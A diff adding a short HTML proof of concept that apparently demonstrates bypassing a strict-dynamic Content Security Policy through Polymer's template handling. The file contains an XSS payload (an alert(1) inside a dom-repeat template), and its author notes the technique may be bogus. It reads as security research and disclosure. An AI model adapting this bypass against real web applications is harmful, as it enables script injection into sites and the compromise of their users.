@@ -1,0 +1,19 @@
+<!doctype html>
+<html>
+  <head>
+    <script src="../bower_components/webcomponentsjs/webcomponents-lite.js"></script>
+	<link rel="import" href="../bower_components/polymer/polymer.html">    
+  </head>
+  <body>
+  <h2>CSP strict-dynamic bypass by @kkotowicz</h2>
+  <h3>via Polymer itself.</h3>
+  <p>Improvement over <a href="poc2.vulcanized.html">poc2.html</a>. No component is needed, as Polymer itself will just document.createElement('script').
+
+  No idea how applicable that one is in real Polymer apps, might be bogus.
+
+  <!-- XSS -->
+<template is="dom-repeat" items="[[1]]"><ssssss>alert(1)</ssssss></template>
+  <!--/XSS-->
+
+</body>
+</html>
